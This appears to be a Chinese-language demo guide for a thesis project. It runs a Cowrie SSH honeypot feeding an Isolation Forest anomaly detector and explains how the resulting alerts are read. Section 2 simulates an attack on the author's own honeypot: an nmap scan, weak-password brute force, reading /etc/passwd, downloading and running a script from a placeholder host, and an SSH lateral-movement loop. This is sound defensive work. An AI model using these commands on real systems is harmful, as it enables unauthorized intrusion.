# 模拟与演示操作步骤（服务器版）

本文档用于在服务器上演示“Cowrie 蜜罐采集 → 特征提取 → 孤立森林异常检测 → 告警输出”，并给出可复现的验证链路与截图点位。

> 说明：当前系统**按源 IP（src_ip）聚合**形成样本，因此要达到 `train_min_samples=5`，最可靠方式是使用 **5 个不同公网出口**（不同网络/热点/设备）分别连接蜜罐一次。

---

## 0. 前置条件

- 服务器已部署并启动（项目目录假设为 `~/abnormal-traffic`）
- 服务器端容器运行正常：

```bash
sudo docker ps
```

- 蜜罐端口已开放（默认 2222；如开启 Telnet profile 还会用到 2223）

### 常见排错：宿主机 `data/cowrie/` 为空

如果你能在 `sudo docker logs cowrie --tail 50` 看到连接与命令（说明蜜罐在工作），但宿主机 `data/cowrie/` 目录仍为空，通常是 **Cowrie 日志挂载路径不正确**。

在服务器执行：

```bash
sudo docker inspect cowrie --format '{{json .Mounts}}'
```

如果你看到类似：

- `Destination":"/cowrie/cowrie-git/var"`（Cowrie 实际工作目录）
- `Destination":"/cowrie/var/log/cowrie"`（你当前挂载的目录）

则应把 `docker-compose.yml` 中 cowrie 的日志挂载改为：

```yaml
- ./data/cowrie:/cowrie/cowrie-git/var/log/cowrie
```

然后重建 cowrie：

```bash
sudo docker compose up -d --force-recreate cowrie
ls -la data/cowrie
```

---

## 1. 服务器端：进入“真实模式”（建议）

真实模式推荐设置：

- `demo_force_anomaly_below_samples: 0`（关闭演示强制异常）
- `contamination: 0.01~0.05`（真实环境更合理）
- `train_min_samples: 5`（演示用的最低训练样本数，太大则难以快速训练）

修改并上传配置后，在服务器上执行以下命令让其生效：

```bash
cd ~/abnormal-traffic
rm -f data/model/iforest.pkl
sudo docker restart detector
sudo docker logs detector --tail 50
```

**预期现象**：当样本不足时日志出现

```text
[cycle] waiting for training data: samples=2/5
```

---

## 2. 本地端：模拟真实攻击链（对你自己的蜜罐 IP）

以下命令在你的本地电脑执行（把 IP 替换为服务器公网 IP，例如 `107.173.156.235`）。

### 2.1 信息收集（扫描）

如本地装有 nmap：

```bash
nmap -sS -sV -p 2222,2223 <SERVER_IP>
```

### 2.2 爆破（多次失败登录）

重复执行 5~10 次，分别输入不同弱口令：

```bash
ssh -p 2222 root@<SERVER_IP>
```

在提示输入密码时依次尝试：`123456`、`root`、`admin`、`password`、`qwerty` 等。

### 2.3 成功登录 + 可疑命令链

登录后执行以下命令（链接可以不存在，目的在于记录行为模式）：

```bash
whoami
uname -a
id
cat /etc/passwd
ps aux | head
netstat -an | head || ss -ant | head
crontab -l
wget http://10.0.0.1/a.sh
curl http://10.0.0.1/b -o /tmp/b
chmod +x /tmp/b
/tmp/b
for i in $(seq 1 20); do ssh 10.0.0.$i; done
exit
```

---

## 3. 关键：如何凑够 5 条样本（train_min_samples=5）

系统按 **src_ip 聚合**，因此：

- 只用同一个网络出口（同一个公网 IP）反复连接，样本数仍可能是 **1**
- 要凑够 5 条样本，最有效方式是 **切换公网出口**（示例）：
  - 电脑连家宽
  - 电脑切手机热点
  - 手机 4G/5G（不同运营商/不同手机）
  - 同学/另一台设备帮你连一次
  - 再换一个热点/校园网

每个公网出口至少执行一次 2.2 + 2.3，即可让日志里出现多个 `src_ip` 样本。

---

## 4. 服务器端：查看训练、预测与告警

### 4.1 查看 detector 日志

```bash
cd ~/abnormal-traffic
sudo docker logs detector --tail 80
```

当样本达到阈值后，会出现类似：

```text
[cycle] trained model on 5 samples -> /app/data/model/iforest.pkl
```

随后每轮会预测，并在出现异常时写告警：

```text
[ALERT] ...
Wrote 1 alert(s) to /app/data/alerts/alerts_YYYYmmdd_HHMMSS.json
```

### 4.2 查看告警文件

```bash
ls data/alerts
cat data/alerts/alerts_*.json
```

### 4.3 告警字段含义（文字说明，可直接写论文）

告警文件（`alerts_*.json`）每条记录通常包含：

- **src_ip**：攻击源（或可疑源）IP。来自日志聚合后的样本主键（本系统按源 IP 聚合）。
- **score**：异常分数（IsolationForest 的 `score_samples` 输出）。一般来说 **越小（越负）越异常**，代表与“正常行为模式”偏离更大。
- **features**：该 `src_ip` 在一个统计周期内聚合得到的特征（本系统默认按源 IP 聚合，特征为数值/计数）。常见特征解释：
  - **conn_count**：该源 IP 的连接/事件计数（Cowrie 事件 + Zeek 连接统计的累加）。
  - **login_fail_count**：登录失败次数（Cowrie `cowrie.login.failed`）。
  - **login_success_count**：登录成功次数（Cowrie `cowrie.login.success`）。
  - **unique_commands**：唯一命令数量（Cowrie `cowrie.command.input` 去重计数）。
  - **session_count**：会话数量（Cowrie `session` 去重计数）。
  - 其他如 `total_duration/bytes/packets/distinct_dst_ports` 主要来自 Zeek 连接日志或可选字段，反映通信规模与持续时间。
- **tags / threat_intel_hit**（可选）：若命中 `config/threat_intel.yaml` 的高风险 IP 列表，会增加标签 `threat_intel:high_risk_ip`，并将 `threat_intel_hit` 标记为 `true`。

---

## 5. 证据链验证（论文/答辩必备）

### 5.1 告警是否来自 Cowrie 日志

假设告警里出现 `src_ip=...`，用 grep 验证：

```bash
grep -n "<SRC_IP>" data/cowrie/cowrie.json | head
grep -n "cowrie.login.failed" data/cowrie/cowrie.json | head
grep -n "cowrie.command.input" data/cowrie/cowrie.json | head
```

#### 如何解读 grep 输出（文字说明）

当你在 `cowrie.json` 中 grep 到某个 `src_ip`，通常会看到如下事件序列（示例）：

- **cowrie.session.connect**：新连接建立，记录源/目的 IP 与端口、session id、时间戳。
- **cowrie.client.version / cowrie.client.kex**：客户端 SSH 版本与密钥交换/指纹信息（可用于分析扫描器/自动化工具特征）。
- **cowrie.login.failed**：弱口令/爆破尝试失败事件，包含 username/password（用于统计 `login_fail_count`）。
- **cowrie.command.input**：进入交互后输入的命令（用于统计 `unique_commands`）。
- **cowrie.session.closed**：会话结束与持续时间。

上述事件与告警中的 `features.login_fail_count / unique_commands / session_count` 是一一对应的统计来源，可作为论文“数据来源可信”与“特征可解释”的证据链。

### 5.3 统计当前已采集到的攻击源（真实公网 IP）

用于展示“系统已捕获到多个真实攻击源”的证据：

```bash
grep -oP '"src_ip"\\s*:\\s*"\\K[^"]+' data/cowrie/cowrie.json | sort | uniq -c
```

输出格式例如：

- `42 104.28.201.73`：表示 `104.28.201.73` 在日志中出现 42 次（多次连接/事件）。
- `10 113.132.212.191`：表示另一个攻击源出现 10 次。

**解释**：此计数反映“事件量”，不等于训练样本数。训练样本数取决于聚合粒度（本系统按 `src_ip` 聚合时，样本数约等于不同 `src_ip` 的数量）。

### 5.2 威胁情报标签（可选）

如果 `config/threat_intel.yaml` 中包含某个高风险 IP，则告警里会出现：

```json
"tags": ["threat_intel:high_risk_ip"]
```

---

## 6. 动态指纹/伪装演示（可选加分）

服务器端切换 Cowrie profile（会重建 cowrie 服务，并轮换 `issue.net/motd`）：

```bash
cd ~/abnormal-traffic
python3 scripts/rotate_cowrie_profile.py --list
python3 scripts/rotate_cowrie_profile.py --apply default_ssh
python3 scripts/rotate_cowrie_profile.py --apply ssh_telnet
```

本地重新 SSH 连接观察 banner 变化：

```bash
ssh -p 2222 root@<SERVER_IP>
```

---

## 7. 建议截图点位（写论文最省事）

- 本地 `ssh -p 2222 root@<SERVER_IP>` 登录时 banner（切 profile 前后各一张）
- Cowrie shell 中输入可疑命令链截图
- 服务器 `sudo docker logs detector --tail 80`（含 trained / ALERT / wrote）
- `data/alerts/alerts_*.json` 内容截图
- `grep "<SRC_IP>" data/cowrie/cowrie.json` 的对应关系截图

